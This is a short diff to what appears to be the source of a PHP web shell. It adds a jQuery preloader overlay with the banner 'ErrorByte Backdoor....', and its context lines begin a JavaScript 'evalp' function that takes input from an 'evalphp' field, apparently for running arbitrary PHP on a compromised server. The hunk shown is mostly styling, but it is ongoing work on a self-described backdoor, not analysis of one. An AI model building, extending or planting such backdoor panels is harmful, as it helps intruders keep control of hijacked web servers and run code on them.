@@ -128,6 +128,38 @@ color: red;
 text-decoration: none;
 }
 </style>
+<script src="http://code.jquery.com/jquery-2.2.1.min.js"></script>
+<style type="text/css">
+.preloader {
+  background: transparent;
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  z-index: 9999;
+  background-color: transparent;
+}
+.preloader .loading {
+  background: transparent;
+  position: absolute;
+  left: 50%;
+  top: 50%;
+  transform: translate(-50%,-50%);
+  font: 14px arial;
+  background-color: transparent;
+}
+</style>
+<div class="preloader">
+  <div class="loading">
+    <font size="20"><b><i>ErrorByte Backdoor....</i></b></font>
+  </div>
+</div>
+<script>
+$(document).ready(function(){
+$(".preloader").fadeOut();
+})
+</script>
 <script type="text/javascript">
     function evalp() {
         var evalphp = document.getElementById('evalphp').value;
